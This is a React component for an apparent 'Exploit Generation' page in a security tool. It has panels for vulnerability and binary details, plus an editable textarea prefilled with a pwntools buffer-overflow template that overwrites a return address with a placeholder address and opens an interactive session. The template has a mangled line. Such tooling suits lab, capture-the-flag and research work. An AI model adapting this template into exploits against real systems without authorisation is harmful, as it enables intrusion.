import classNames from 'classnames'

import styles from './styles.module.css'
import { useState } from 'react'

const defaultCode =
  "from pwn import *  \n# Set up the context \n\ncontext(os='linux', arch='i386') \n\n# Modify as per the target binary's environment\n# Path to the vulnerable binary \n\nbinary = './vuln'\n# Offset to overwrite the return address \n\noffset = 64  \n# Change based on the binary's buffer overflow offset\n# Address to jump to (for demonstration, let's use 0xdeadbeef \nas a placeholder) \n\ntarget_address = p32(0xdeadbeef)  \n# Start the process \nio = process(binary)  \n\n# Craft the payload \npayload = b'A' * offset  \n# Filler to overflow the buffer \npayload += target_address  \n# Overwrite the return address\n# Send the \n\npayloadprint(f\"Sending payload: {payload}\") \nio.sendline(payload)  \n# Interact with the process (optional) \n\nio.interactive()"

export default function ExploitGeneration() {
  const [code, setCode] = useState(defaultCode)
  return (
    <>
      <div className={styles.cards}>
        <div className={styles.card}>
          <h2>Vulnerability Details</h2>
          <textarea
            className={styles.whiteTextArea}
            readOnly={true}
            value={'statistics'}
          ></textarea>
        </div>
        <div className={styles.card}>
          <h2>Binary Details</h2>
          <textarea
            className={styles.whiteTextArea}
            readOnly={true}
            value={'staticAnalysis'}
          ></textarea>
        </div>
      </div>
      <div style={{ height: '1rem' }}></div>
      <div className={styles.card}>
        <h2>Exploit Code</h2>
        <textarea
          className={classNames(styles.whiteTextArea, styles.monospaceFont)}
          placeholder='Enter vulnerable code'
          value={code}
          onChange={e => setCode(e.target.value)}
        ></textarea>
        <div className={styles.buttonLayout}>
          <button>Copy</button>
          <button>Run</button>
        </div>
      </div>
    </>
  )
}
